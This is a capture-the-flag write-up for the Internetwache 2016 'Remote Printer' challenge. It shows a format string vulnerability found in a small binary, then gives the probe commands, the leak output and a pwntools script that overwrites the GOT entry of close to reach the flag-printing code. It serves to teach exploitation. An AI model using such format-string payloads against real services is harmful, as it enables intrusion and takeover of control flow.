# Internetwache CTF 2016 : Remote Printer

**Category:** Exploit
**Points:** 80
**Solves:** 101
**Description:**

> Description: Printer are very very important for offices. Especially for remote printing. My boss told me to build a tool for that task.
>
>
> Attachment: [exp80.zip](./exp80.zip)
>
>
> Service: 188.166.133.53:12377


## Write-up

So this remote printer takes an address and a port and connects to the remote
service. It then reads some data and outputs it. Well let's just point it to
itself:

```
$ nc 188.166.133.53 12377
This is a remote printer!
Enter IPv4 address:127.0.0.1
Enter port:12377
Thank you, I'm trying to print 127.0.0.1:12377 now!
This is a remote printer!
```

The last line is the input from itself. So we probably need a listener
reachable via the internet.

The binary itself is rather small, it just consists of the `main` function and
`0x08048786`. The main function uses scanf to read the ip address and port and
calls the second function which connects to the given ip address and port.
Then receives up to `0x2000` bytes of data and then prints it. Let's take a
look at the later one:

```
0x08048815      6a00           push 0
0x08048817      6800200000     push 0x2000
0x0804881c      8d85e4dfffff   lea eax, [ebp-local_2055]
0x08048822      50             push eax
0x08048823      ff75f4         push dword [ebp - 0xc]
0x08048826      e885fdffff     call sym.imp.recv         ; recv 0x2000 to stack

[...]

0x08048844      83ec0c         sub esp, 0xc
0x08048847      8d85e4dfffff   lea eax, [ebp-local_2055]
0x0804884d      50             push eax
0x0804884e      e88dfcffff     call sym.imp.printf      ; input
0x08048853      83c410         add esp, 0x10
0x08048856      83ec0c         sub esp, 0xc
0x08048859      ff75f4         push dword [ebp - 0xc]
0x0804885c      e85ffdffff     call sym.imp.close
0x08048861      83c410         add esp, 0x10
0x08048864      90             nop
```

We can see that the buffer, which is located on the stack, is printed using
`printf`... oh. Classic format string vulnerability. Should be easy.

```
$ python2 -c 'print "ABCD" + ".%p"*100' | nc -vv -l -p 4444
$ nc 188.166.133.53 12377
This is a remote printer!
Enter IPv4 address:X.X.X.X
Enter port:4444
Thank you, I'm trying to print X.X.X.X:4444 now!
ABCD.0xffffbcec.0x2000.(nil).(nil).(nil).(nil).0x44434241.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0xa.(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil)
```

So it's definitely a format string vulnerability and we can see that at offset
7 is the start of our format string. So that's where we can put the addresses
we want to write to.

We can see that immediately after the call to `printf` there is a call to
`close`. So we do the usual: Overwrite `GOT` entry of `close` with something of
our liking to take over control flow. Because the organizers were nice they
left us some dead code lying around that will print us the flag at
`0x08048867`. So we'll just redirect control flow there.

```python
from pwn import *  # NOQA

velf = ELF("./RemotePrinter")
gotclose = velf.got["close"]

# uses two 2-byte writes to keep printed garbage at minimum
fmtstr = p32(gotclose)
fmtstr += p32(gotclose + 2)
target = 0x08048867
x = 0x0804 - 8
y = 0x8867 - 8 - x
fmtstr += "%{}c%8$hn%{}c%7$hn".format(x, y)

log.info("trying to write to got entry @ {}".format(hex(gotclose)))
log.info("overwriting with function {}".format(hex(target)))

log.info("using format string: \n" + hexdump(fmtstr))

with open("./payload", "wb") as f:
    f.write(fmtstr)
    f.write("\n")

# use with
# cat payload | nc -v -l -p 4444
```

And we have the flag:

```
YAY, FLAG: IW{YVO_F0RmaTt3d_RMT_Pr1nT3R}
```

## Other write-ups and resources

* <https://github.com/0xbkth/ctf/blob/master/IW/exp80_IW/writeup.md>
* <https://www.xil.se/post/internetwache-2016-exp80-kbeckmann/>
* <https://github.com/Kileak/CTF/tree/master/2016/internetwache/exp/remoteprinter>
* <https://losfuzzys.github.io/writeup/2016/02/21/iwctf2016-remote-printer/>
* [0x90r00t](https://0x90r00t.com/2016/02/22/internetwache-ctf-2016-exploit-80-remote-printer-write-up/)
* [Whitehatters Academy](https://www.whitehatters.academy/iw2016-ctf-exp80/)
* <https://github.com/ByteBandits/writeups/tree/master/internetwache-ctf-2016/exploit/remote-printer/sudhackar>
* <https://bannsecurity.com/index.php/home/10-ctf-writeups/31-internetwache-ctf-2016-remote-printer>
* <http://www.amn3s1a.com/blog/writeup/2016/02/23/exp80-iw-writeup.html>
* [Spanish](https://blog.ka0labs.net/post/31/)
* <https://github.com/tothi/ctfs/tree/master/internetwache-ctf-2016/exploit/remote-printer-80>
* <https://github.com/VulnHub/ctf-writeups/blob/master/2016/internetwache/exp80.md>
* <https://pwningmad.wordpress.com/2016/02/21/internetwasche-ctf-2016-exploit-80-remote-printer/>
